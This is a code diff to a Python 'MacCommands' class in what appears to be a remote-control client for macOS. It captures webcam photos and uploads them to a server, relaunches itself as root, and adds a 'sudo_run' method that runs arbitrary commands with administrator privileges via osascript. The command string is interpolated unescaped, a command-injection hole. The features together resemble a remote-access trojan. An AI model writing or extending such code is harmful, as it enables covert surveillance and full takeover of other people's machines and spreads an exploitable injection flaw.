@@ -220,7 +220,6 @@ class MacCommands(CommonCommands):
             import os
             from core.utils.formatting import get_time, get_size
 
-            # 检查 imagesnap 是否安装
             result = subprocess.run(['which', 'imagesnap'], capture_output=True)
             if result.returncode != 0:
                 return 0, '请安装 imagesnap: brew install imagesnap'
@@ -232,13 +231,11 @@ class MacCommands(CommonCommands):
                            capture_output=True, timeout=5)
 
             if os.path.getsize(temp_file.name) > 0:
-                filename = f'webcam_{get_time()}.jpg'
                 self._upload_single_file_to_server_result(temp_file.name, category='webcam')
-
                 file_size = get_size(os.path.getsize(temp_file.name))
                 os.unlink(temp_file.name)
 
-                return 1, f'Webcam photo captured: {filename} ({file_size})'
+                return 1, f'Webcam photo captured: {temp_file.name} ({file_size})'
             else:
                 os.unlink(temp_file.name)
                 return 0, 'Failed to capture webcam photo'
@@ -246,9 +243,9 @@ class MacCommands(CommonCommands):
         except Exception as e:
             return 0, f'Webcam capture failed: {e}'
 
-    @desc('Launch new instance with sudo (macOS)', group='platform')
+    @desc('Launch new instance with sudo', group='platform')
     @interruptible()
-    def sudo_launch(self):
+    def sudo_self(self):
         """以 root 权限启动新实例，返回 PID"""
         import subprocess
         from core.utils.client_util import get_executable_path
@@ -263,6 +260,22 @@ class MacCommands(CommonCommands):
         )
 
         return 1, f'New instance launched with sudo (parent PID: {proc.pid})'
+
+    @desc('Run command with sudo', group='platform')
+    @interruptible()
+    def sudo_run(self, command):
+        """以 root 权限执行命令 (macOS)"""
+        import subprocess
+        try:
+            result = subprocess.run(
+                ['osascript', '-e', f'do shell script "{command}" with administrator privileges'],
+                capture_output=True, text=True, timeout=30
+            )
+            if result.returncode == 0:
+                return 1, result.stdout
+            return 0, result.stderr
+        except Exception as e:
+            return 0, f'Failed: {e}'
 
     @desc('Securely delete file (overwrite)', group='file')
     @interruptible()
